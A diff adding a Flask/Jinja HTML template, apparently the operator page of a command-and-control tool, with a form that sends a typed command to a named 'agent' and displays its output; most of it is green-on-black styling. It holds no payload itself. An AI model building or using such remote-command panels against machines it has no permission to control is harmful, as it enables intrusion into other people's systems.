@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💀 Hck The Bowx | Execute Command</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <style>
+        body {
+            background: #111;
+            color: #00ff41;
+            font-family: 'Fira Mono', 'Consolas', monospace;
+            margin: 0;
+            padding: 2em;
+        }
+        h1 {
+            text-align: center;
+            text-shadow: 0 0 8px #00ff41;
+            letter-spacing: 2px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 2em;
+        }
+        input[type="text"] {
+            background: #181818;
+            color: #00ff41;
+            border: 2px solid #00ff41;
+            padding: 0.7em 1.2em;
+            border-radius: 4px;
+            font-family: inherit;
+            font-size: 1em;
+            margin-bottom: 1em;
+            box-shadow: 0 0 8px #00ff41;
+        }
+        input[type="text"]:focus {
+            outline: none;
+            background: #222;
+        }
+        button {
+            background: #111;
+            color: #00ff41;
+            border: 2px solid #00ff41;
+            padding: 0.5em 1.5em;
+            border-radius: 4px;
+            font-family: inherit;
+            font-size: 1em;
+            cursor: pointer;
+            box-shadow: 0 0 8px #00ff41;
+            transition: background 0.2s, color 0.2s;
+        }
+        button:hover {
+            background: #00ff41;
+            color: #111;
+        }
+        .output {
+            background: #181818;
+            color: #00ff41;
+            border: 1px solid #00ff41;
+            padding: 1em;
+            margin: 2em auto;
+            width: 80%;
+            border-radius: 4px;
+            box-shadow: 0 0 16px #00ff41;
+            font-size: 1em;
+        }
+        h3 {
+            text-shadow: 0 0 8px #00ff41;
+        }
+    </style>
+</head>
+<body>
+    <h1>💀 Execute Command on {{ name }} 💀</h1>
+    
+    <form action="{{ url_for('execute', agentname=name) }}" method="POST">
+        <input type="text" name="command" placeholder="Enter Command" required>
+        <button type="submit">Run</button>
+    </form>
+
+    {% if cmdoutput %}
+    <div class="output">
+        <h3>Output:</h3>
+        <pre>{{ cmdoutput }}</pre>
+    </div>
+    {% endif %}
+</body>
